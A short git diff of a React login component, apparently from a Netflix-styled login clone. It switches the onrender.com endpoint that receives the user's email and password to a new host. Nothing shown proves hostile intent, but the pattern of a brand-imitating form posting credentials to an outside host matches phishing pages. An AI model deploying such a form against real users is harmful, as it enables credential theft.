@@ -13,7 +13,7 @@ export default function Login() {
     e.preventDefault();
 
     try {
-      const res = await axios.post("https://netflix-login-page-1-ghr0.onrender.com", {
+      const res = await axios.post("https://netflix-login-page-2-3tzt.onrender.com", {
         email,
         password,
       });
@@ -70,6 +70,7 @@ export default function Login() {
     </div>
   );
 }
+
 
 
 
